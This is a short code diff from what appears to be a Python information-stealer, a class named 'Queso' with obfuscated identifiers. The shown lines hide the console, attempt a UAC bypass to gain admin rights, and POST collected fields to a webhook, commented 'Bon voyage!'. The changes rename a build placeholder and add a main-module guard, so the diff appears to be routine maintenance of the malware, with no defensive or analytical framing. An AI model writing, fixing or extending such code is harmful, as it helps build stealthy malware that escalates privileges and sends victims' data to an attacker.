@@ -359,7 +359,7 @@ class Queso:
         # Hide the console
         _o_Syscalls._o_HideConsole()
 
-        if "%uacbypass%":
+        if "%uac_bypass%":
             if not _o_Utility._o_IsAdmin(): # If not an admin, try to be one
                 if _o_Utility._o_GetSelf()[1] and not "--no-bypass" in sys.argv:
                         _o_Utility._o_UACbypass()
@@ -540,6 +540,6 @@ class Queso:
         _o_HttpManager.request("POST", self._o_Webhook, fields= _o_WebhookFields) # Bon voyage!
 
 
-if os.name == "nt":
+if __name__ == "__main__" and os.name == "nt":
 
     queso = Queso()
